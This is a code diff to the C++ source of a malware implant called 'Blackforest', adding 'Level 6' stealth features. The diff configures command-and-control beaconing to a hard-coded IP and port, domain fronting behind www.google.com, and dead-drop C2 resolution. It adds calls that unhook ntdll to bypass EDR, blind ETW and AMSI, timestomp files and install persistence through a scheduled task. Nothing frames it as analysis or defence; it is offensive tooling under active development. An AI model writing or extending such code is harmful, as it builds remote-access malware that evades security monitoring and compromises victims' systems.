@@ -16,6 +16,8 @@
 #include "exfil/dead_drop.hpp" // New
 #include "core/evasion/process_migration.hpp" // New
 #include "exfil/beacon.hpp" // New
+#include "core/evasion/unhooker.hpp" // Level 6
+#include "core/evasion/blinder.hpp"  // Level 6
 
 #include <iostream>
 #include <vector>
@@ -141,9 +143,12 @@ public:
     Blackforest() : poly(1234), dns("example.com"), tcp("192.168.0.3", 4444), secureLog(poly, dns, tcp) {
         if(CheckDebuggers()) exit(0);
         
+        // --- LEVEL 6: NETWORK RESILIENCE CONFIG ---
+        tcp.SetFrontDomain("www.google.com"); 
+        tcp.AddEndpoint("192.168.0.3", 4444); // Primary
+        tcp.AddEndpoint("127.0.0.1", 4444);    // Local Debug Fallback
+        
         // 1. Resolve C2 from Dead Drop
-        // NOTE: In production, upload a text file with "192.168.0.3:4444" to Pastebin
-        // and put the RAW URL here.
         std::string masterUrl = "http://192.168.0.3/c2.txt"; 
         
         std::string resolved = DeadDrop::Resolve(masterUrl);
@@ -152,18 +157,22 @@ public:
              if(colon != std::string::npos) {
                  std::string ip = resolved.substr(0, colon);
                  int port = std::stoi(resolved.substr(colon+1));
-                 tcp.SetTarget(ip, port); // Update Target
+                 tcp.AddEndpoint(ip, port); // Add resolved to pool
                  std::cout << "[*] Resolved C2: " << ip << ":" << port << std::endl;
              }
         } else {
-             // Fallback
-             tcp.SetTarget("192.168.0.3", 4444);
-             std::cout << "[!] Dead Drop Failed. Using Fallback." << std::endl;
+             std::cout << "[!] Dead Drop Failed. Using Fallback Pool." << std::endl;
         }
     }
     
     void Start() {
         running = true;
+        
+        // --- LEVEL 6: STEALTH INITIALIZATION ---
+        Unhooker::UnhookNtdll(); // Bypass EDR hooks
+        Blinder::BlindETW();     // Blind host reporting
+        Blinder::BlindAMSI();    // Blind script scanning
+
         Timestomp::CloneExplorer(); // Anti-Forensics
         InstallPersistence();
         ScheduledTask::Install();   // Backup Persistence
